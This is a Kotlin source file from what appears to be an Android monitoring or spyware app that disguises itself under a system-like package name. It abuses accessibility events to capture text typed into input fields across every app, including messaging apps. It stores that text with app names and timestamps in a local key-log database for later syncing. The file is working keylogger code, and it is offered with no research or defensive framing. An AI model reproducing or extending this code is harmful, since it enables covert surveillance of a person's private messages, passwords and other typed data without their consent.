package com.android.services.accessibility.data

import android.content.Context
import com.android.services.accessibility.AccessibilityUtils
import com.android.services.db.entities.KeyLog
import com.android.services.interfaces.OnAccessibilityEvent
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.models.AccessibilityEventModel
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.logVerbose
import java.util.*

class ViewTextChangeEventData(val localDatabaseSource: LocalDatabaseSource) : OnAccessibilityEvent {

    override fun onAccessibilityEvent(
        context: Context,
        accessibilityEventModel: AccessibilityEventModel,
    ) {
        try {
            if(AccessibilityUtils.syncKeyLogs){
                val eventClassName = accessibilityEventModel.eventClassName
                val eventText = accessibilityEventModel.eventText
                val eventPackage = accessibilityEventModel.packageName
                if (eventClassName == "android.widget.EditText") {
                    retrieveKeyLog(context,
                        eventText,
                        eventPackage,
                        ::setLastTypedText,
                        ::insertTypedKeys,
                        ::setLastIMTypedText)
                }
            }
        } catch (e: Exception) {
            logVerbose("$TAG exception = ${e.message}")
        }
    }

    /**
     * Retrieves the typed key logs, and inserts into database
     * @param context context of app
     * @param eventText Event Text
     * @param eventPackage event package
     * @param setLastIMTypedText This methods saves the last typed keyboard text
     * @param insertTypedKeys This method takes care of saving the KeyLogs
     * @param setLastTypedText This method saves last typed text of IM Logs
     */
    private inline fun retrieveKeyLog(
        context: Context,
        eventText: String?,
        eventPackage: String,
        setLastTypedText: (String?, String) -> Unit,
        insertTypedKeys: (Context) -> Unit,
        setLastIMTypedText: () -> Unit,
    ): Unit {
        setLastTypedText(eventText, eventPackage)
        insertTypedKeys(context)
        setLastIMTypedText()
    }

    private fun setLastTypedText(eventText: String?, eventPackage: String) {
        var typedText = ""
        if (eventText != null) typedText = eventText
        logVerbose("$TAG keyLog package name = $eventPackage")
        typedText = typedText.substring(1, typedText.length - 1)
        logVerbose("$TAG keyLog text = $typedText")
        AccessibilityUtils.lastTypedText = typedText
        AccessibilityUtils.lastPackageName = eventPackage
    }

    ///////////////////////////////////////////////////////////////////////////
    // Set Last Type Text IM Logs
    ///////////////////////////////////////////////////////////////////////////
    private fun setLastIMTypedText() {
        if (!AccessibilityUtils.lastTypedText.contains("Type a message")) AccessibilityUtils.lastIMTypedText =
            AccessibilityUtils.lastTypedText
    }

    /**
     * save the Pressed Keys to database
     */
    private fun insertTypedKeys(context: Context) {
        try {
            val timeStamp = System.currentTimeMillis().toString()
            val keyLog = KeyLog()
            keyLog.uniqueId = AppUtils.md5Hash(AppUtils.generateUniqueID() + timeStamp)
            keyLog.datetime = AppUtils.formatDate(timeStamp)
            keyLog.appName = AppUtils.getAppNameFromPackage(AccessibilityUtils.lastPackageName)
            keyLog.data = AccessibilityUtils.lastTypedText
            keyLog.date = AppUtils.getDate(System.currentTimeMillis())
            keyLog.status = 0

            val keys: Set<String> = keyLoggerHashMap.keys
            if (keys.isNotEmpty()) {
                var found = false
                for (key in keys) {
                    val matchedKey = if (key.length > 1) key.substring(0, key.length - 1) else key
                    if (AccessibilityUtils.lastTypedText.startsWith(matchedKey)) {
                        keyLoggerHashMap.remove(key)
                        keyLoggerHashMap[AccessibilityUtils.lastTypedText] = keyLog
                        found = true
                    }
                }
                if (!found) {
                    for ((_, value) in keyLoggerHashMap) {
                        logVerbose("$TAG saved key log = ${value.data}")
                        localDatabaseSource.insertKeyLog(value)
                    }
                    keyLoggerHashMap.clear()
                    keyLoggerHashMap = HashMap()
                    keyLoggerHashMap[AccessibilityUtils.lastTypedText] = keyLog
                }
            } else {
                keyLoggerHashMap[AccessibilityUtils.lastTypedText] = keyLog
            }
        } catch (e: Exception) {
            logVerbose("$TAG Error inserting keys data")
        }
    }

    companion object {
        private const val TAG = "ViewTextChangeEventData"
        private var keyLoggerHashMap = Collections.synchronizedMap(HashMap<String, KeyLog>())
    }
}